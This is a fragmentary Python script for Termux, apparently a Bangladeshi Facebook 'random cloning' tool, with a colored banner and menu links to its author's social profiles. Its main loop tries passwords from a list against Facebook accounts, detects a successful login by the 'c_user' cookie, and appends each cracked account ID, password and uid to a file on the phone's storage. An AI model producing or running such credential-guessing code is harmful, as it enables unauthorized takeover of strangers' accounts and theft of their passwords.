...
\33[1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝                      
\33[1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗               
║  \x1b[97m\033[37;41m   BANGLADESHI RANDOM CLONING V15 \033[0;m    ║
\33[1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝            
\33[1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
...
\33[1;92m║➣\033[1;34m GITHUB     :          ASRAF-143         \33[1;92m ║          
...
def Main():
	...
	if opt in ["B","2"]:
		admin()
	if opt in ["C","3"]:
		os.system('xdg-open https://www.facebook.com/Asraf.420.65');time.sleep(1)
		fb()
	if opt in ["D","4"]:
...
def admin():
	...
	if bal =='1':
		os.system('xdg-open https://wa.me/+880185802966');time.sleep(1)
		admin()
	if bal =='2':
		os.system('xdg-open https://www.facebook.com/Asraf.420.65');time.sleep(1)
		admin()
	if bal =='3':
		os.system('xdg-open https://www.youtube.com/@termux1025');time.sleep(1)
		admin()
	if bal =='0':
		Main()
        ...
        for ps in pwx:
           ...
           'sec-ch-ua': '"(Not(A:Brand";v="99"',
            ...
            if 'c_user' in log_cookies:
                ...
                oks.append(cid)
                open('/sdcard/ASRAF.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
